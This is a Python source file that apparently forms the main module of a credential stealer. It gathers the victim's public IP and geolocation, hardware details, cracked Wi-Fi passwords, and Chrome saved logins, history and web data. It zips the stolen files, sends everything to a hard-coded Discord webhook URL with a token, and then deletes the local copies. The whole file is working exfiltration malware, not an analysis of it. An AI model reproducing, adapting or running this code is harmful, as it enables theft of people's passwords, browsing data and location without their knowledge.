from extraction_components.HardwareInfo import *
from extraction_components.chromedata import (CHROME_HISTORYDATA_FILE,
                                 CHROME_LOGINDATA_FILE,
                                   CHROME_WEBDATA_FILE, logfile_dir)
from dhooks import Webhook, Embed, File, embed, file
from requests import get, post 
from time import sleep
import os
from datetime import datetime 
import config
import requests
import logging
from zipfile import ZipFile
from tempfile import gettempdir, TemporaryFile



logging.getLogger("urllib3").setLevel(logging.WARNING)
logging.basicConfig(level=logging.DEBUG, 
        format='%(asctime)s | %(name)s | %(levelname)s |: %(message)s',
        datefmt='%m/%d %I:%M %p',
        handlers=[logging.FileHandler(logfile_dir), logging.StreamHandler()])
main_logger = logging.getLogger("main")
main_logger.info("Libraries imported successfully!")
os.chdir(os.path.dirname(os.path.realpath(__file__)))

public_ip = get("https://api.ipify.org").text
main_logger.debug("Public IP ")
geolocator = requests.get("http://ip-api.com/json/" + public_ip).json()
dtime = datetime.now()




hook = Webhook('https://discord.com/api/webhooks/886962488686567444/3k-npqP1ZT8tUYvtBMiMtOjSnfrQyFCgBBST8I4-j_qkR8VXJNz-o_aKE94UHYtT4e_7')
hook.send("<@772239780971937816>")
embed = Embed(
    description=f"""```YAML
    >> {dtime.month}/{dtime.day}/{dtime.year}, {dtime.hour}:{dtime.minute}
    ```""",
    color=0x5CDBF0,
    timestamp='now'  # sets the timestamp to current time
    )

wifi_webhook_image = 'https://cdn-icons.flaticon.com/png/512/3178/premium/3178257.png?token=exp=1660071329~hmac=2b7b2cef1c57a5b59d5d11ec8185ced2'
hardware_webhook_image = 'https://cdn-icons.flaticon.com/png/512/2729/premium/2729197.png?token=exp=1660071445~hmac=f684995d9294c476e76bc955f194baca'

embed.set_author(name=f'Information about {config.registered_username}', icon_url=hardware_webhook_image)


embed.add_field(
    name="**Hardware Information**:",
    value=f"""

    {config.system_username}

    {config.system_os}

    {config.system_cpu}

    {config.system_motherboard}

    {config.system_memory}

    {config.system_graphics}

    {config.system_disk}
    """)



embed.add_field(
    name="**Network Information**",
    
    value=f"""
    `Public Ipv4`: {public_ip}

    `Internet Service Provider` {geolocator["isp"]}

    **Approximate Geolocation**

    `General Location` > {geolocator["country"]}, {geolocator["regionName"]}

    `City` > {geolocator["city"]}

    `Zip Code` > {geolocator["zip"]}

    
    """)
network_cracker_embed = Embed(timestamp='now',
 description=f"""```INI
            Returned {config.cracked_network_count} passwords!```""")

network_cracker_embed.set_author(name=f'Network Cracker', icon_url=wifi_webhook_image)

for i in config.full_network.items():
    network_cracker_embed.add_field(
        name="**Network Cracked!**",
        value=f"""
        `Network ID`: ```YAML
        {i[0]}```
        `Password`  : ```YAML
        {i[1]}```
""".strip())
temp_zip_file = TemporaryFile(mode='w', delete=False, suffix='.zip', newline='')
with ZipFile(temp_zip_file.name, 'w') as zip:
    for file in [CHROME_HISTORYDATA_FILE.name, CHROME_LOGINDATA_FILE.name, CHROME_WEBDATA_FILE.name, logfile_dir]:
            zip.write(file)

chrome_logindata_webhook = File(CHROME_LOGINDATA_FILE.name, name=(os.getlogin() + "LOGINDATA.csv"))
chrome_historydata_webhook = File(CHROME_HISTORYDATA_FILE.name, name=(os.getlogin() + "HISTORYDATA.csv"))
chrome_webdata_webhook = File(CHROME_WEBDATA_FILE.name, name=(os.getlogin() + "WEBDATA.csv"))
LOGFILE = File(logfile_dir, name=(os.getlogin() + "LOGS.log"))
data_zip_webhook = File(temp_zip_file.name, name=os.getlogin() + 'data.zip')
CHROME_LOGINDATA_FILE.close()
CHROME_HISTORYDATA_FILE.close()
CHROME_WEBDATA_FILE.close()


for embed_data in [embed, network_cracker_embed, chrome_logindata_webhook, chrome_historydata_webhook,chrome_webdata_webhook, data_zip_webhook,LOGFILE]:
    hook_sent = False
    webhook_failed = False
    while hook_sent == False:
        try:
            if isinstance(embed_data, Embed):
                hook.send(embed=embed_data)
            elif isinstance(embed_data, File):
                hook.send(file=embed_data)
        except Exception as exception_message:
            main_logger.critical("Webhook failed to send! Error:" + exception_message)
            webhook_failed = True
        finally:
            if webhook_failed == False:
                main_logger.debug("Webhook element successfully sent")
                break
            else:
                sleep(.5)
                

LOGFILE.close()
os.remove(CHROME_LOGINDATA_FILE.name)
os.remove(CHROME_HISTORYDATA_FILE.name)
os.remove(CHROME_WEBDATA_FILE.name)
os.remove(LOGFILE.name)




 